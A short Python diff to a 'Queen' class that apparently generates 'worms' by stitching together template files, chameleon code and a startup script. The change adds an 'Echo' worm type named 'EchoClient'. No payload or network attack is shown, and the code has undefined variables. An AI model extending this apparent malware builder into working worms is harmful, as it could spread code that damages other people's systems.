@@ -16,7 +16,8 @@ class Queen:
         self.linikingDir()
         self.loadChamCode()
         self._temp = {"basic" : self.loadTemp("basicW.py"),
-                    "start" : self.loadTemp("startup.py")}
+                    "start" : self.loadTemp("startup.py"),
+                    "echo" : self.loadTemp("echo.py")}
         self._emptyConf = {"MULTIPROCESING_FREEZE" : None}
 
 
@@ -63,6 +64,10 @@ class Queen:
             case "Basic":
                 conf.update({"WORM_NAME" : "BasicWorm"})
                 a = self.renderTemplate("basic", conf)
+            case "Echo":
+                conf.update({"WORM_NAME" : "EchoClient"})
+                a = self.renderTemplate("basic", conf)
+                b = self.renderTemplate("echo")
         startup = self.renderTemplate("start", conf)
         fcode = self.chamCode + a + b + c + d + startup
         worm_name = self.saveWorm(name, types, fcode)
